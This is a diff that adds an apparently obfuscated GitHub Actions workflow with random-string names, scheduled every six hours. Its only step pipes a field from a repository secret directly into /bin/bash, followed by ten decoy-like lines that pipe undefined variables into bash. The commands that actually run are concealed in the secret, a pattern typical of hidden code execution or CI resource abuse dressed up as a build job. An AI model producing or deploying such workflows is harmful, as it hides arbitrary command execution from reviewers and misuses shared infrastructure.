@@ -1,0 +1,27 @@
+name: dongkuishi6715
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongkuishi6715
+        env:
+          uchuj88542: ${{ secrets.uchuj88542 }}
+        run: |
+          echo $uchuj88542 | jq -r .usrcg1 | /bin/bash
+          echo $n2 | jq -r .psks58 | /bin/bash
+          echo $y7905 | jq -r .d4501 | /bin/bash
+          echo $an55335 | jq -r .dzeth1 | /bin/bash
+          echo $wvqr55 | jq -r .zxmge6232 | /bin/bash
+          echo $hjl0253 | jq -r .sbkmh486 | /bin/bash
+          echo $kxnd796 | jq -r .lbnpt28885 | /bin/bash
+          echo $jk107 | jq -r .cd56227 | /bin/bash
+          echo $zk33419 | jq -r .fw06 | /bin/bash
+          echo $g00984 | jq -r .vfbj9 | /bin/bash
+          echo $e5 | jq -r .oooj0240 | /bin/bash
+
